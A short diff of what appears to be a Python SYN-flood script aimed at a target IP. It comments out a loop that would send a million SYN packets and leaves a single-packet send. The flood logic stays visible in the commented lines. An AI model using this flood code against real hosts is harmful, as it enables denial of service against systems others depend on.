@@ -14,7 +14,12 @@ if __name__ == '__main__':
     attacker_ip = args_list[0]
     target_ip = args_list[1]
 
-    # iterate with 100 iterations and send the 10k syn to target
+    # # iterate with 100 iterations and send the 10k syn to target
+    # for i in range(100):
+    #     for j in range(10000):
+    #         syn_pkt = build_syn_packet(attacker_ip, target_ip)
+    #         send(syn_pkt)
+
     for i in range(0, 1):
         syn_pkt = build_syn_packet(attacker_ip, target_ip)
         send(syn_pkt)
